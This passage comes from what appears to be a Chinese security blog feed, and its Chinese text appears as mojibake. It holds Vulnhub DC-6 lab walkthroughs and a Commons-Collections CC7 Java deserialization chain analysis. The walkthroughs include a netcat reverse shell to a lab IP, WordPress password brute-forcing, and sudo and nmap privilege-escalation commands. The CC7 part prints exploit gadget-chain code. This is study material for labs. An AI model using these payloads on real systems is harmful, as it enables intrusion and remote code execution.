&gt;&gt; backups.sh</span><br></pre></td></tr></table></figure><p>emmmmï¼Œä½¿ç”¨è¿™ä¸ªå‘½ä»¤æˆåŠŸäº†ä½†æ˜¯æ‰§è¡Œå‘½ä»¤è€æ˜¯å¤±è´¥ï¼Œå¼¹ä¸ªshellè¯•è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.75.158 6666</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101548691.png" alt="image-20230710154855636"><br>æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œè¦ç¨å¾®ç­‰ä¸€ä¼šå„¿<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101549662.png" alt="image-20230710154922627"><br>æ‹¿åˆ°rootæƒé™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307101549169.png" alt="image-20230710154932069"></p>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-6</title>
      <link href="/2023/07/Vulnhub-DC-6/"/>
      <url>/2023/07/Vulnhub-DC-6/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-6.zip">https://download.vulnhub.com/dc/DC-6.zip</a></p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p>å­˜æ´»IPæ‰«æ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091912733.png" alt="image-20230709190836443"><br>è®¿é—®IPæ˜¾ç¤ºåŸŸåä½†æ— æ³•è§£æï¼Œå’Œå‰é¢æœ‰å°DCé¶æœºä¸€æ ·ï¼Œè¿™é‡Œæˆ‘åœ¨winä¸‹ä¿®æ”¹hostsæ–‡ä»¶ï¼Œæ‰“å¼€è¿™ä¸ªæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091913352.png" alt="image-20230709191335290"><br>ç„¶åæ­£å¸¸è®¿é—®ï¼Œç½‘ç«™æ˜¯WordPressçš„CMSï¼Œç›´æ¥æ°¸wpscanå…ˆæ‰«ä¸€æ³¢ï¼Œè¿™ä¸ªç«Ÿç„¶æ²¡æ‰«åˆ°ç™»å½•ç•Œé¢ï¼Œdirsearchå†æ‰«ä¸€æ³¢æ‰¾åˆ°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091913908.png" alt="image-20230709191345851"><br>å†ä½¿ç”¨wpscanæ‰«ä¸€æ³¢ç”¨æˆ·åï¼Œå¾—åˆ°5ä¸ªç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url wordy -e u</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091913053.png" alt="image-20230709191354956"><br>ç„¶åæ˜¯çˆ†ç ´å¯†ç  ï¼Œè¿™é‡Œvulnhubç»™äº†æç¤ºè®©ç”¨å“ªä¸ªå­—å…¸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OK, this isn&#x27;t really a clue as such, but more of some &quot;we don&#x27;t want to spend five years waiting for a certain process to finish&quot; kind of advice for those who just want to get on with the job.</span><br><span class="line"></span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå»ç”Ÿæˆä¸€ä¸‹å­—å…¸ï¼Œè¿™é‡Œæ–°ç‰ˆkaliå¯èƒ½æ²¡ç”¨è§£å‹è¿™ä¸ªæ–‡ä»¶éœ€è¦è§£å‹ä¸€ä¸‹ï¼Œç”Ÿæˆå‘½åç›´æ¥ç”¨æç¤ºçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure><p>ä¸è¦copyæ•°æ®æœ‰ç‚¹å¤šğŸ¤”ï¼Œç„¶åå»çˆ†ç ´å§ï¼Œè¿™é‡Œè·¯å¾„ä»€ä¹ˆçš„è‡ªå·±è¦æ³¨æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url wordy --enumerate u -P passwords.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è´¦å·å¯†ç <code>mark helpdesk01</code>ç„¶åç™»å½•ä¸Šå»å‘ç°æœ‰ä¸ªActivity monitorçœ‹wpè¯´è¿™ä¸ªæ˜¯æœ‰æ¼æ´çš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091914208.png" alt="image-20230709191455156"></p><h2 id="æ‹¿shell"><a href="#æ‹¿shell" class="headerlink" title="æ‹¿shell"></a>æ‹¿shell</h2><p>è¿™ä¸ªæˆ‘ä¹Ÿæ²¡æ¥è§¦è¿‡ï¼Œçœ‹é¡µé¢å¥½åƒæ˜¯ä¸ªç™»å½•æ—¥å¿—åŠŸèƒ½ï¼Œmsfæœä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091914719.png" alt="image-20230709191440660"><br>ç”¨è¿™ä¸ªå°è¯•ä¸€ä¸‹ï¼Œå…ˆcopyçœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</span><br></pre></td></tr></table></figure><p>æ‰“å¼€çœ‹åˆ°æœ‰ä¸ªåå¼¹shellçš„ä»£ç <br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915132.png" alt="image-20230709191509096"><br>é‚£ä¹ˆæŠŠåŸŸåå’ŒIPæ”¹ä¸€ä¸‹å°±è¡Œï¼Œç„¶åå°±åˆ©ç”¨å¤±è´¥ï¼Œæ²¡åŠæ³•æ‰‹åŠ¨æ¥å§ï¼ŒæŠ“ä¸ªå‘½ä»¤æ‰§è¡Œç‚¹çš„åŒ…å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915091.png" alt="image-20230709191524042"><br>æ·»åŠ è¦æ‰§è¡Œçš„å‘½ä»¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915307.png" alt="image-20230709191535273"><br>æ‹¿åˆ°shellåˆ©ç”¨pythonè½¬æ¢ä¸ºäº¤äº’å¼shellï¼Œç„¶åå°±æ˜¯ææƒäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>å…ˆçœ‹ä¸€ä¸‹å“ªäº›å‘½ä»¤å…·æœ‰suidæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>æ²¡å‘ç°æˆ‘ç†Ÿæ‚‰çš„ä¸œè¥¿ï¼Œè¿›å…¥homeç›®å½•çœ‹çœ‹ï¼Œé€šè¿‡ä¸€ç•ªç›®å½•æŸ¥çœ‹æ‰¾åˆ°äº†æç¤ºæ–‡ä»¶things-to-do.txt<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091915324.png" alt="image-20230709191549243"><br>å¾—åˆ°äº†grahamç”¨æˆ·çš„å¯†ç ï¼Œé‚£ä¹ˆå»è¿™ä¸ªç”¨æˆ·ä¸‹çœ‹çœ‹ï¼Œç¿»äº†ä¸‹æ–‡ä»¶æ²¡å•¥ä¸œè¥¿ï¼ŒæŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™<code>sudo -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916387.png" alt="image-20230709191602340"><br>è¿™ä¸ªç”¨æˆ·å¯ä»¥ä»¥jensç”¨æˆ·æ¥è¿è¡Œbackups.shå…ˆæ‰“å¼€çœ‹çœ‹ï¼Œå‘ç°æ²¡å•¥ä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¿›è¡Œå†™å…¥æ“ä½œï¼Œé‚£ä¹ˆå†™å…¥<code>echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</code>è¿™æ ·èƒ½å°†shellåˆ‡æ¢åˆ°jensç”¨æˆ·ï¼Œå†™å…¥åä»¥jensç”¨æˆ·æ‰§è¡Œæ–‡ä»¶<code>sudo -u jens ./backups.sh</code>æˆåŠŸåˆ‡æ¢shell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916468.png" alt="image-20230709191616408"><br>é‚£ä¹ˆå†æŸ¥çœ‹ä¸€ä¸‹å½“å‰ç”¨æˆ·çš„æƒé™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916466.png" alt="image-20230709191631408"><br>å¯ä»¥ç”¨rootæ¥è¿è¡Œnmapå¹¶ä¸”ä¸éœ€è¦å¯†ç ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨nmapææƒï¼Œnmapæœ‰æ‰§è¡Œè„šæœ¬çš„åŠŸèƒ½ï¼Œé€šè¿‡ç¼–å†™ç‰¹æ®Šè„šæœ¬ï¼Œå¯ä»¥å®ç°åˆ©ç”¨nmapææƒ<br>è¿™é‡Œnmapææƒåˆ†äº†ä¸¤ç§ï¼Œå…¶å®å°±æ˜¯ä¸åŒç‰ˆæœ¬ä¸‹çš„æ–¹å¼</p><ol><li>æ—§ç‰ˆæœ¬ææƒ<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># è¿›å…¥nmapçš„äº¤äº’æ¨¡å¼</span><br><span class="line">nmap --interactive</span><br><span class="line"># æ‰§è¡Œshï¼ŒææƒæˆåŠŸ</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure></li><li>æ–°ç‰ˆæœ¬ææƒ<br>å†™å…¥ä¸€ä¸ªæ‰§è¡Œbashçš„nmapè„šæœ¬ï¼Œè¿è¡Œ<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916759.png" alt="image-20230709191645705"><br>ææƒæˆåŠŸï¼Œæ‹¿flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091916290.png" alt="image-20230709191657223"></li></ol>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾7</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE7/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE7/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>CommonsCollections 3.1 - 3.2.1ï¼Œjdkå¥½åƒæ˜¯æ²¡æœ‰é™åˆ¶çš„</p><h2 id="é“¾å­åˆ†æ"><a href="#é“¾å­åˆ†æ" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><p>è¿™é‡Œå…¶å®ååŠéƒ¨åˆ†å’ŒCC1ä¹Ÿæ˜¯ä¸€æ ·åªä¸è¿‡å…¥å£ç‚¹å˜äº†ï¼Œè¿™é‡Œä¸º<code>Hashtable</code>è¿™ä¸ªç±»ï¼Œæ‰¾æ ·æ˜¯æŠŠä»–å’Œ<code>LazyMap</code>è¿èµ·æ¥ï¼Œä½†æ˜¯è¿™é‡Œä¸ç›´æ¥å»find usagesäº†ï¼Œå› ä¸ºgetè°ƒç”¨å®åœ¨å¤ªå¤šäº†ï¼Œæ‰€ä»¥ç›´æ¥çœ‹ï¼Œæœ€åæ˜¯æ‰¾åˆ°äº†<code>AbstractMap</code>ç±»ï¼Œå®ƒçš„<code>equals()</code>æ–¹æ³•è°ƒç”¨äº†<code>get()</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091350772.png" alt="image-20230709134923730"><br>é‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾è°è°ƒç”¨äº†<code>equals()</code>æ–¹æ³•ï¼Œä»è¿™é‡Œå¼€å§‹ä¼šé‡åˆ°å‰é¢å‡ æ¡é“¾æ²¡æœ‰è¿‡çš„è°ƒç”¨æ–¹å¼å°±æ˜¯è°ƒç”¨å­ç±»æ²¡æœ‰çš„æ–¹æ³•é‚£ä¹ˆå°±ä¼šå»åˆ°çˆ¶ç±»è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œ<code>HashMap</code>è¿™ä¸ªç±»ç»§æ‰¿äº†<code>AbstractMap</code>ç±»<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091350873.png" alt="image-20230709135028795"><br>è€Œ<code>HashMap</code>ç±»æ²¡æœ‰<code>equals()</code>æ–¹æ³•é‚£ä¹ˆè°ƒç”¨<code>HashMap</code>ç±»<code>equals()</code>æ–¹æ³•å°±ä¼šè°ƒåˆ°<code>AbstractMap</code>ç±»çš„<code>equals()</code>æ–¹æ³•æ‰€ä»¥æ¥ä¸‹æ¥å°±å»å¯»æ‰¾è°ƒç”¨äº†<code>key.equals</code>æˆ‘ä»¬æ§åˆ¶keyçš„ç±»å‹ä¸ºHashMapå°±è¡Œäº†ï¼Œæœ€ç»ˆæ˜¯åœ¨<code>HashTable</code>ç±»çš„<code>reconstitutionPut()</code>æ–¹æ³•è°ƒç”¨äº†<code>key.equals</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091350009.png" alt="image-20230709135043925"><br>å…¶å®è¿™é‡Œ<code>equals</code>çš„è°ƒç”¨è¿˜æ˜¯æŒºç»•çš„ï¼Œä¸€å¼€å§‹æ˜¯ä¼ LazyMapå¯¹è±¡åˆ°<code>AbstractMap</code>ç±»å»è°ƒç”¨<code>equals</code>å°±ç›¸å½“äºLazyMapè°ƒç”¨<code>equals</code>ä½†æ˜¯LazyMapæ²¡æœ‰<code>equals</code>æ‰€ä»¥å°±å»LazyMapçš„çˆ¶ç±»<code>AbstractMapDecorator</code>æ‰¾è™½ç„¶<code>AbstractMapDecorator</code>æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä½†å®ƒå®ç°äº†<code>equals</code>æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123; </span><br><span class="line"><span class="comment">//åˆ¤æ–­å½“å‰å¯¹è±¡ä¸ä¼ å…¥å¯¹è±¡æ˜¯å¦ä¸ºåŒä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">    <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> map.equals(object);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>AbstractMapDecorator</code>ç±»çš„<code>equals</code>æ–¹æ³•åªæ¯”è¾ƒäº†è¿™ä¸¤ä¸ªkeyçš„å¼•ç”¨ï¼Œå¦‚æœä¸æ˜¯åŒä¸€å¯¹è±¡ä¼šå†æ¬¡è°ƒç”¨<code>equals</code>æ–¹æ³•ï¼Œmapæ˜¯é€šè¿‡<code>LazyMap</code>ä¼ è¿‡æ¥çš„ç›¸å½“äºæ˜¯<code>LazyMap</code>çš„å¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨æ„é€ åˆ©ç”¨é“¾çš„æ—¶å€™ï¼Œé€šè¿‡<code>LazyMap</code>çš„é™æ€æ–¹æ³•<code>decorate</code>å°†<code>HashMap</code>ä¼ ç»™äº†mapå±æ€§ï¼Œå› æ­¤è¿™é‡Œä¼šè°ƒç”¨<code>HashMap</code>çš„<code>equals</code>æ–¹æ³•ã€‚æ‰€ä»¥åˆå»<code>AbstractMapDecorator</code>çˆ¶ç±»å³<code>AbstractMap</code>ç±»æ‰¾æœ€ç»ˆæ‰¾åˆ°è°ƒç”¨äº†<code>equals</code>ç„¶åå†<code>AbstractMap</code>ç±»å»è°ƒç”¨<code>LazyMap</code>è°ƒç”¨getï¼Œè¿™é‡Œæƒ³äº†åŠå¤©<code>AbstractMapDecorator</code>ç±»æ€ä¹ˆå’Œ<code>HashMap</code>æ‰¯ä¸Šå…³ç³»çš„<br>ç°åœ¨å°±æ˜¯æ‰¾è°è°ƒç”¨äº†<code>reconstitutionPut()</code>æ–¹æ³•ï¼Œæœ€ç»ˆåœ¨åŒä¸€ä¸ªç±»å³<code>HashTable</code>ç±»çš„<code>readObject()</code>æ–¹æ³•è°ƒç”¨äº†<code>reconstitutionPut()</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351732.png" alt="image-20230709135106646"><br>é‚£ä¹ˆåˆ°è¿™é‡Œé“¾å­å°±åˆ†æå®Œäº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351548.png" alt="image-20230709135114488"></p><h2 id="EXPè°ƒè¯•"><a href="#EXPè°ƒè¯•" class="headerlink" title="EXPè°ƒè¯•"></a>EXPè°ƒè¯•</h2><p>è¿™é‡Œå…ˆæŠŠCC1çš„ååŠæ®µæ‹¿è¿‡æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯å’Œ<code>AbstractMap</code>ç±»è¿èµ·æ¥ä½†æ˜¯è¿™ä¸ªç±»æ˜¯ä¸å¯ä»¥åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸å¤ªå¥½å†™è¿™ä¸€éƒ¨åˆ†çš„expå°±ç›´æ¥å¾€åå§ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å’Œå…¥å£ç±»çš„<code>reconstitutionPut</code>æ–¹æ³•ç»“åˆèµ·æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;  </span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹ä¼ è¿›çš„ Entry å¯¹è±¡æ•°ç»„è¿›è¡Œäº†å¾ªç¯ï¼Œé€ä¸ªè°ƒç”¨<code>e.key.equals(key)</code>ï¼Œè¿™é‡Œä¼ è¿›å»çš„å‚æ•°keyå¦‚æœæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£ä¹ˆ<code>AbstractMap.equals()</code>ä¸­çš„må°±æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚é‚£ä¹ˆè¿™é‡Œåœ¨å…¥å£ç±»ä¼ å…¥æ¶æ„keyç„¶åè°ƒç”¨<code>key.equals</code>å°±å¯è¡Œï¼Œåƒä¸‹é¢è¿™æ ·<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351569.png" alt="image-20230709135145421"><br>ä½†ç»“æœæ˜¯æ²¡ååº”ï¼Œè¯´æ˜è¿™æ ·ä¸è¡Œdebugå‘ç°æ ¹æœ¬ä¸ä¼šè¿›å…¥<code>equals</code>æ–¹æ³•ï¼Œå»çœ‹çœ‹ysoå®˜æ–¹é“¾å­<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091351189.png" alt="image-20230709135138136"><br>è¿™é‡Œç”¨äº†ä¸¤ä¸ªmapå¹¶ä¸”ä½¿ç”¨äº†ä¸¤æ¬¡putï¼Œä¸‹é¢å°±åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆè¦è¿™æ ·åšï¼Œè¿™é‡Œå¯ä»¥è¯¦ç»†äº†è§£ä¸€ä¸‹<code>reconstitutionPut</code>æ–¹æ³•ï¼Œ<a href="https://blog.csdn.net/qq_35733751/article/details/119862728">å‚è€ƒåšå®¢</a>è¿™é‡Œå°±ä¸é‡å¤å†™äº†</p><ul><li><strong>ä¸ºä»€ä¹ˆè¦è°ƒç”¨ä¸¤æ¬¡put</strong><br>å› ä¸ºæˆ‘ä»¬éœ€è¦è¿›å…¥åˆ°<code>reconstitutionPut()</code>æ–¹æ³•é‡Œé¢çš„forå¾ªç¯å»è°ƒç”¨<code>e.key.equal()</code>ä½†æ˜¯å‘ç°<br>ç¬¬ä¸€æ¬¡è°ƒç”¨çš„æ—¶å€™ç›´æ¥è·³å‡ºäº†forå¾ªç¯å› ä¸ºè¿™ä¸ªæ—¶å€™<code>tab[index]</code>ä¸ºç©ºï¼Œç„¶ååœ¨åé¢æ‰ç»™<code>tab[index]</code>èµ‹å€¼ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦è°ƒç”¨ä¸¤æ¬¡æ¥ç¡®ä¿è¿›å…¥forå¾ªç¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091352691.png" alt="image-20230709135205523"><br>ç„¶åè¿™é‡Œè¿˜æœ‰ä¸ª<code>e.hash == hash</code>åˆ¤æ–­ï¼Œåœ¨åˆ¤æ–­é‡å¤å…ƒç´ çš„æ—¶å€™æ ¡éªŒäº†ä¸¤ä¸ªå…ƒç´ çš„hashå€¼æ˜¯å¦ä¸€æ ·ï¼Œä¸ºçœŸåæ‰ä¼šæ‰§è¡Œåˆ°<code>e.key.equal()</code>ï¼Œè€Œè¿™ä¸ªå–å‡ºæ¥åˆ¤æ–­çš„å…¶å®å°±æ˜¯lazyMap1å¯¹è±¡çš„hashå€¼å®ƒè¦ç­‰äº ç°åœ¨çš„å¯¹è±¡ä¹Ÿå°±æ˜¯ lazyMap2 çš„hashå€¼ï¼Œè¿™ä¸ªhashå€¼æ˜¯åœ¨lazyMapå¯¹è±¡ä¸­çš„ <code>key.hashCode()</code> å¾—åˆ°çš„ï¼Œè€Œåœ¨è¿™é‡Œæˆ‘ä»¬putåˆ°lazyMap1çš„å€¼yyç„¶åå»è®¡ç®— <code>&quot;yy&quot;.hashCode()</code> ï¼ŒlazyMap2 çš„ä¸ºzZå°±å†<code>&quot;zZ&quot;.hashCode()</code>è¿™æ ·ç»è®¡ç®—ä»–ä»¬çš„hashå€¼æ˜¯ä¸€æ ·çš„ï¼Œå½“ç„¶è¿™é‡Œå¯ä»¥ç”¨å…¶å®ƒå­—æ¯ç»„åˆä¸ä¸€å®šæ˜¯è¿™ä¸¤ä¸ªï¼Œå‚è€ƒ<a href="https://blog.csdn.net/qq_64201116/article/details/128401981">æ¸…é£å¸ˆå‚…çš„åšå®¢</a>é‡Œé¢è¯¦ç»†è§£é‡Šäº†è¿™é‡Œçš„è®¡ç®—åŸç†<br>ç„¶åè¿™é‡Œè¿˜æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åœ¨<code>HashTable.put()</code> ä¹‹åéœ€è¦åœ¨map2<code>remove()</code> æ‰ yyå› ä¸º <code>HashTable.put()</code> ä¹Ÿä¼šè°ƒç”¨åˆ° <code>equals()</code> æ–¹æ³•ï¼Œå½“è°ƒç”¨å®Œ <code>equals()</code> æ–¹æ³•åï¼ŒLazyMap2 çš„ key ä¸­å°±ä¼šå¢åŠ ä¸€ä¸ª yy é”®ï¼Œåºåˆ—åŒ–çš„æ—¶å€™æ²¡é—®é¢˜å¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091353231.png" alt="image-20230709135354102"><br>ä½†æ˜¯ååºåˆ—åŒ–<code>m.size()</code>å°±ä¼šå˜ä¸º2ä½†æ˜¯åŸæœ¬çš„sizeè¿˜æ˜¯1<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091354645.png" 